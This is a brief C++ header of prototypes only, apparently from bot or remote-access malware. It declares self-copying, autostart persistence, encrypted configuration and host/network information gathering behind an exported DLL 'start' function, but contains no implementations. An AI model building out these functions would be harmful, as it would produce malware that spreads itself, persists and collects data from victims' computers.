extern "C" _declspec(dllexport)
void start();

int numtok(const char *str, char chr);

int rrand(int min, int max);

int cpuspeed();

unsigned long resolvehost(const char *host);

unsigned __int64 cyclecount();

char *gettok(const char *str, int tok, char chr);

char *resolveip(unsigned long ip);

char *sysinfo();

char *netinfo();

bool isip(const char *address);

void *makethread(unsigned int (__stdcall *start)(void *), void *arg);

void localip();

void syscopy();

void autostart();

void uninstall();

void decryptconfig();

void decrypt(char *buf, int bufsiz, const char *str, const char *key);

void encrypt(char *buf, int bufsiz, const char *str, const char *key);

